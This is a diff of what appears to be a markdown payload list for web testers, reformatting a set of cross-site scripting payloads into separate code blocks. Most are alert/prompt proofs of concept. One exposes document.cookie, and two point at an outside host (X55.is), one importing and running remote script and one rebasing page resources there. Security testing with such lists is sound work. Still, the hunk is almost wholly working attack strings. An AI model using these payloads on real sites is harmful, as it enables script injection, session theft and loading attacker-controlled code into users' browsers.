@@ -24,20 +24,42 @@ The payloads are organized to help testers quickly validate:
 
 ```
 "><img src=x onerror=alert(1)>
+```
+```
 <img src=x onerror=prompt(1)>
+```
+```
 "><img src=e onerror=confirm(document.cookie)>"/>
+```
+```
 <img src=x onerror=alert(1)>
+```
+```
 <Img Src=//X55.is OnLoad=import(src)>
+```
+```
 <Svg OnLoad=alert(1)>
+```
+```
 “AutoFocus OnFocus=alert(1)//
+```
+```
 <K ContentEditable AutoFocus OnFocus=alert(1)>
+```
+```
 ‘-alert(1)-’
+```
+```
 JavaScript:alert(1)
+```
+```
 \’/alert(1)//
+```
+```
 <K OnPointerRawUpdate=alert(1)>
+```
+```
 <Base Href=//X55.is>
-
-
 ```
 
 ---
